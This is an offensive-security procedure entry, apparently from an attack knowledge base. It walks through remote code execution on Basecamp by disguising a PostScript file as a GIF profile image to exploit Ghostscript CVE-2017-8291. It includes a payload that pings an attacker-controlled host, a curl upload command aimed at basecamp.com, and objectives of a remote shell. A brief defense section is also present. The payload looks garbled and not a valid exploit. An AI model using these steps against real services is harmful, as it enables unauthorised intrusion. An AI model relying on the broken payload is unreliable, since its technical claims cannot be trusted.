---
id: proc-uuid-1
tags:
  - rce
  - file-upload
  - ghostscript
  - cve-2017-8291
type: procedure
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/GraphicsMagick]]'
  - '[[tools/Ghostscript]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ping-rce-poc]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:24:14.790Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Upload-Malicious-PostScript-as-Profile-Image

## Summary

This procedure exploits a lack of proper file validation in Basecamp's profile image upload by disguising a malicious PostScript file as a GIF, leading to remote code execution via vulnerable Ghostscript invoked by ImageMagick or GraphicsMagick.

## Description

The attack targets web applications that process uploaded images server-side without validating file content, relying only on extensions. By crafting a PostScript file with the '%!' magic header and embedding shell commands that exploit CVE-2017-8291 in Ghostscript, an attacker can achieve RCE. The server converts the 'image' using ImageMagick/GraphicsMagick, which delegates PostScript handling to Ghostscript, executing the payload. This grants a remote shell, allowing further actions like data exfiltration or privilege escalation. Prerequisites include a valid user account on the target (e.g., Basecamp) and knowledge of the server's image processing stack.

## Requirements

1. Valid authenticated session to Basecamp or similar vulnerable application
2. Attacker-controlled domain for verifying execution (e.g., via ping callback)
3. Text editor to craft the PostScript payload
4. Web browser or curl for file upload

## Defense

Defensive measures and detection strategies:

- Implement strict file validation using magic bytes (e.g., verify GIF header 47 49 46 38) instead of extensions
- Update Ghostscript to a patched version post-CVE-2017-8291
- Disable PostScript/EPS processing in ImageMagick/GraphicsMagick (use -dSAFER flag or policy.xml restrictions)
- Monitor server logs for unexpected Ghostscript invocations or outbound connections from image processing
- Use WAF rules to block uploads with '%!' in content

## Objectives

1. Bypass file upload restrictions to inject malicious payload
2. Trigger server-side execution of embedded shell commands
3. Verify RCE and establish remote shell access

## Instructions

### Step 1: Craft Malicious PostScript Payload

**Context**: Create a PostScript file exploiting CVE-2017-8291 by embedding shell commands after the '%!' header. Use a simple ping as proof-of-concept to confirm execution without causing damage.

**Command** ([[commands/ping-rce-poc]]):

Save the following as rce.ps:

```bash
%!PS
( /sh (ping -c1 attacker.com) ) | open
```

> This payload uses PostScript to execute the ping command via Ghostscript's vulnerability. Replace 'attacker.com' with your controlled domain. Expected output: No local output, but server will send a ping packet to attacker.com.

### Step 2: Disguise and Upload File

**Context**: Rename the file to mimic a valid image and upload it through the profile image endpoint to trigger processing.

**Command** (Upload via browser or curl):

```bash
# If using curl (adapt to Basecamp's endpoint, requires auth cookies/session)
curl -X POST -F "profile_image=@rce.gif" -H "Cookie: session=your_session" https://basecamp.com/account/edit
```

> Rename rce.ps to rce.gif before upload. The server accepts it due to .gif extension but processes as PostScript via '%!' header. Expected output: Successful upload response; monitor attacker.com for ping traffic to confirm RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/ping-rce-poc]]

## Tools Used

- [[tools/ImageMagick]]
- [[tools/GraphicsMagick]]
- [[tools/Ghostscript]]

## Tags

- rce
- file-upload
- ghostscript
- imagemagick
- cve-2017-8291
